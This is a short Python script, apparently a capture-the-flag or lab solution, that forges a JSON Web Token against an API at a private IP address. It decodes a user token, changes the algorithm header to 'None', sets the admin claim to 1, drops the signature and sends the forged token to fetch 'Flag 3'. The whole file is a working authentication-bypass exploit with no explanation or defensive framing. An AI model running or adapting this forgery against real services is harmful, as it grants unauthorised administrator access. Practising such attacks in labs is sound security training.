import requests
import base64
import json

TARGET_IP = "10.64.168.127"
BASE_URL = f"http://{TARGET_IP}/api/v1.0"
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"

# Change algorithm to None
parts = token.split('.')
header = json.loads(base64.b64decode(parts[0] + '==').decode())
header['alg'] = 'None'

payload = json.loads(base64.b64decode(parts[1] + '==').decode())
payload['admin'] = 1

new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
new_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
new_token = f"{new_header}.{new_payload}."

headers = {'Authorization': f'Bearer {new_token}'}
url = f"{BASE_URL}/example3?username=admin"
response = requests.get(url, headers=headers)
print(f"Flag 3: {response.text}")